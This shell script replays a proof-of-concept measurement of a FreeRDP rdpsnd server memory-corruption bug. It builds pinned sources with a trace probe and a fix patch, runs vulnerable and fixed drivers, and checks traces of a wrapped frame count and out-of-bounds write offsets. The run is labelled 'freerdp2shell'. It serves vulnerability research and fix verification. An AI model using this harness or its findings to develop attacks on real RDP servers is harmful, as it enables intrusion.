#!/bin/sh
# One-command replay of the FreeRDP W21 wire-byte-provenance measurement
# (CVE-2026-114045 / GHSA-3m9q-g533-rqjq, pinned 3.32.0 d27a4f7c).
#
# Drives the REAL rdpsnd_server_recv_formats() parser, SelectFormat() and
# SendSamples() from PocWireByteRange.c: the client's only byte array (cbSize
# waveform extension, 0x5a) lands in a separate allocation, while the write
# window carries server-capture bytes (0xde). Modes: vuln, nocall, benign,
# fixed. The fixed binary compiles the same driver against a scratch copy of
# rdpsnd_main.c carrying wake21-fixed-guard.patch (upstream-style
# nBlockAlign / 7 < nChannels guard).
#
# IN-PROCESS measurement, not a live RDP session. No probe leaves loopback
# (no network probe at all here; only an optional git clone for provisioning).
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK=${FREERDP_WORK:-/tmp/fr-wake2}
# Dedicated source/build paths keep this receipt independent of scratch trees.
SRC=$WORK/wire-src3320
PLAIN=$WORK/wire-build3320_plain
OUT=${FREERDP_WIRE_OUT:-$WORK/wire-byte-range-replay}
PIN=d27a4f7c1c63b62a5e60e5d939ad116cfb58ffc1
TAG=3.32.0
CLONE_URL=${FREERDP_CLONE_URL:-https://github.com/FreeRDP/FreeRDP.git}
# Same plain-build feature flags as run.sh.
FEATURE_FLAGS="-DWITH_SERVER=ON -DWITH_CLIENT=OFF -DWITH_SERVER_CHANNELS=ON -DWITH_KRB5=OFF -DWITH_PKCS11=OFF -DWITH_SMARTCARD_EMULATE=OFF -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DCHANNEL_URBDRC=OFF -DWITH_CUPS=OFF -DWITH_FUSE=OFF"

fail() { echo "FAIL: $*" >&2; exit 1; }

if [ ! -d "$SRC/.git" ]; then
    mkdir -p "$WORK"
    git clone --depth 1 --branch "$TAG" "$CLONE_URL" "$SRC"
fi
[ "$(git -C "$SRC" rev-parse HEAD)" = "$PIN" ] || fail "pinned 3.32.0 source missing at $SRC"
[ -z "$(git -C "$SRC" status --porcelain)" ] || fail "replay source is dirty: $SRC"

if [ ! -f "$PLAIN/server/common/libfreerdp-server3.so" ]; then
    cmake -S "$SRC" -B "$PLAIN" -GNinja -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS='' $FEATURE_FLAGS
    ninja -C "$PLAIN" -j16 libwinpr3.so libfreerdp3.so libfreerdp-server3.so
fi

# Exact flags used for the 13:07:32Z W21 evidence: plain gcc, no sanitizer.
# $3 selects the instrumented pinned copy; fixed adds the guard patch.
compile() {
    gcc -g -O1 -fno-omit-frame-pointer -std=gnu11 -Wno-deprecated-declarations \
        ${3:+"$3"} -I"$SRC/winpr/include" -I"$PLAIN/winpr/include" -I"$PLAIN" \
        -I"$PLAIN/include" -I"$SRC/include" -I"$SRC/channels/rdpsnd/server" \
        -I"$SRC/channels/rdpsnd/common" \
        "$1" -o "$2" \
        -L"$PLAIN/libfreerdp" -L"$PLAIN/winpr/libwinpr" -L"$PLAIN/server/common" \
        -Wl,-rpath,"$PLAIN/libfreerdp:$PLAIN/winpr/libwinpr:$PLAIN/server/common" \
        -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
}

mkdir -p "$OUT"
PROBEDIR=$WORK/wire-probed
PROBE=$PROBEDIR/rdpsnd_main.c
FIXDIR=$WORK/wire-fixed
FIX=$FIXDIR/rdpsnd_main.c

# W21 included the scratch WAKE9_COPY probe in its translation unit. Recreate
# it from the committed patch on a pristine pinned blob, then layer the fixed
# guard on a copy. Never compile the caller's potentially modified worktree.
mkdir -p "$PROBEDIR" "$FIXDIR"
git -C "$SRC" show "$PIN:channels/rdpsnd/server/rdpsnd_main.c" > "$PROBE"
patch -s "$PROBE" < "$HERE/wake8-patches/server-wake9-copy-trace.patch"
cp "$PROBE" "$FIX"
patch -s -p1 -d "$FIXDIR" < "$HERE/wake21-fixed-guard.patch"
grep -q 'WAKE9_COPY dst_off=' "$PROBE" || fail 'copy probe patch did not apply'
grep -q 'nBlockAlign / 7ULL' "$FIX" || fail 'fixed-guard patch did not apply'

compile "$HERE/PocWireByteRange.c" "$OUT/PocWireByteRange" \
    -DRDPSND_MAIN_SRC="\"$PROBE\"" || fail 'vuln compile'
compile "$HERE/PocWireByteRange.c" "$OUT/PocWireByteRangeFixed" \
    -DRDPSND_MAIN_SRC="\"$FIX\"" || fail 'fixed compile'

LOG=$OUT/wire_byte_range.txt
{
    printf 'freerdp2shell W21 replay %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
    printf 'build: gcc plain %s; pinned src %s\n' "$PLAIN" "$PIN"
    printf 'POC: PocWireByteRange.c; wire marker 0x5a in cbSize=256 blob; capture 0xde\n'
    printf '\n'
    for m in vuln nocall benign; do
        printf '=== mode=%s ===\n' "$m"
        "$OUT/PocWireByteRange" "$m" 2>&1
    done
    printf '=== mode=fixed ===\n'
    "$OUT/PocWireByteRangeFixed" fixed 2>&1
} > "$LOG"

check() { grep -Fq "$1" "$LOG" || fail "expected trace missing: $2"; }
check 'data[0]=5a data[255]=5a' 'wire blob parsed'
check 'out_frames=0xfffffffffffffffc out_buffer_size=8820' 'wrapped out_frames'
check 'wire_blob-out_buffer delta=-272 bytes' 'separate wire allocation'
check '8880=de 8888=de 8920=de 8928=de 8992=de 9000=de 12000=de' 'capture bytes at W20 slots'
check 'window [8820,25204): wire_0x5a=0 capture_0xde=16384' 'wire excluded from write window'
check '8992=00 9000=00' 'nocall zeroes custom/context'
check 'out_frames=0x000000000000089d' 'benign and fixed no wrap'
check 'SelectFormat rc=6 out_frames=0x000000000000089d' 'fixed guard rejects format'
[ "$(grep -c 'RESULT=WIRE_EXCLUDED wire_at_call_target=0' "$LOG")" -eq 2 ] || fail 'vuln/nocall verdicts'
[ "$(grep -c '^WAKE9_COPY dst_off=0 cframesize=' "$LOG")" -eq 4 ] || fail 'copy probe missing from modes'

echo "ALL W21 CHECKS PASS; trace at $LOG"
cat "$LOG"
